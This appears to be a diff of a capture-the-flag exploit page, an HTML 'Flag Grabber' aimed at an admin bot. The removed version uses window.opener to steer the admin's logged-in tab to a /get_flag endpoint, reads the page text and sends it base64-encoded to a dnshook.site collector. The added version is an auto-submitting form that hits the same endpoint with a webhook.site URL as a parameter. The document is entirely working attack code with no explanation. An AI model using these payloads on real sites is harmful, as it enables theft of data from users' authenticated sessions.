@@ -1,25 +1,8 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Flag Grabber</title></head>
-  <body>
-    <h1>Olá Admin :)</h1>
-    <script>
-      if (window.opener) {
-        // Redireciona a aba original (com cookie) para a flag
-        window.opener.location = "http://34.134.162.213:17001/get_flag";
-
-        // Após esperar a flag carregar, tenta ler e exfiltrar
-        setTimeout(() => {
-          try {
-            let flag = window.opener.document.body.innerText;
-            let img = new Image();
-            img.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/" + btoa(flag);
-          } catch (e) {
-            let err = new Image();
-            err.src = "https://f0455fd0-b8ef-49b3-ba00-a015762e26ad.dnshook.site/error_" + btoa(e.message);
-          }
-        }, 2500);
-      }
-    </script>
+  <body onload="document.forms[0].submit()">
+    <form action="http://34.134.162.213:17001/get_flag" method="GET">
+      <input type="hidden" name="x" value="https://webhook.site/f0455fd0-b8ef-49b3-ba00-a015762e26ad">
+    </form>
   </body>
 </html>
